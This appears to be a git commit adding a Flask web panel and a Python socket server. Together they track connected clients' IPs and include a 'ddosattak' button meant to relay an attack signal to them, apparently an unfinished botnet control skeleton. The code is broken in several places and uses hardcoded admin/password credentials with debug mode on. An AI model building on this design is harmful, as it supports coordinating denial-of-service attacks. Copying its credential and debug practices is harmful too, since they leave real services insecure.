e9582f91858ab4bbff3eedaccfb0c612bd0161b2
DanSeraf <seraf.daniele@gmail.com>
2018-03-14 16:50:24 +0100

    Initial commit

---
+++ FlaskInterface.py
@@ -0,0 +1,43 @@
+from flask import Flask
+from flask import Flask, flash, redirect, render_template, request, session, abort
+import os
+import socket
+import json 
+
+app = Flask(__name__)
+ 
+@app.route('/')
+def home():
+    if not session.get('logged_in'):
+        return render_template('login.html')
+    else:
+        return "Welcome back!"
+ 
+@app.route('/login', methods=['POST'])
+def do_admin_login():
+    if request.form['password'] == 'password' and request.form['username'] == 'admin':
+        session['logged_in'] = True
+    else:
+        flash('wrong password!')
+    
+@app.route('/update', methods=['GET', 'POST'])
+def conn():
+    data = []
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(("127.0.0.1",34567))
+    data_b = sock.recv(4096)
+    data = json.loads(data_b.decode('utf-8'))
+    return render_template('update.html', data = data)
+    
+    if request.form['submit'] == 'ddosattak':
+        segnale = request.form['submit']
+        sock.send(segnale.encode('utf-8'))
+        
+
+
+    
+
+if __name__ == "__main__":
+    app.secret_key = os.urandom(12)
+    app.debug=True
+    app.run()
---
+++ Server.py
@@ -0,0 +1,53 @@
+#!/usr/bin/env python
+
+import socket
+import string 
+import select 
+import json 
+
+host = '127.0.0.1'
+port = 34567
+sock_by_ip = {}
+
+def start_server(host, port, sock_by_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((host, port))
+    sock.listen(5)
+    print('[*] Server listen on %s:%d' % (host,port))
+    print('[*] Enstablish connection with clients')
+    inputs = [sock]
+    outputs = []
+    catch_ip = [] # List of all ip connected
+    x = 0
+    
+    while inputs:
+        readable, writable, error = select.select(inputs, outputs, [])
+        if len(readable) != 0:
+            for fds in readable:
+                 if fds is sock:
+                    connection, addr = fds.accept()
+                    inputs.append(connection)
+                    catch_ip.append(addr[0])
+                    data = json.dumps(catch_ip)
+                    sock_by_ip[addr[0]] = inputs[x]
+                    x += 1
+                    print(sock_by_ip)
+                    print(catch_ip)
+                    
+                    if addr[0] == '127.0.0.1':
+                        connection.send(data.encode('utf-8'))
+                 else:
+                    data = connection.recv(1024)
+                    data_list = data.decode('utf-8')
+                    data_list = data.split(':')
+                    
+                    if not data:
+                        inputs.remove(fds)
+                    else:
+                        for fds in writable:
+                            write_sock = sock_by_ip[data_list[1]]
+                            write_sock.send(data_list)
+
+
+if __name__ == '__main__':
+    start_server(host, port, sock_by_ip)
